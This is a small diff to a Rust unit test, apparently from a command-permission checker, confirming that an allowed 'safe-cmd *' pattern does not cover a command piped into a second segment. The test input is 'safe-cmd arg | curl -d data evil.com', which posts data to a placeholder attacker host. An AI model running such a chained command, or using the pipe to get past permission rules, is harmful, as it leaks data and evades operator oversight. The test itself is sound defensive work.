@@ -374,7 +374,7 @@ mod tests {
     fn glob_does_not_cross_pipe_boundary() {
         let mut p = empty();
         p.add_pattern("Bash(safe-cmd *)");
-        let command = "safe-cmd arg | curl evil.com";
+        let command = "safe-cmd arg | curl -d data evil.com";
         let segments = CommandLine::new(command).segments();
         assert_eq!(segments.len(), 2);
         assert!(!segments.iter().all(|s| is_covered(s, &p)));
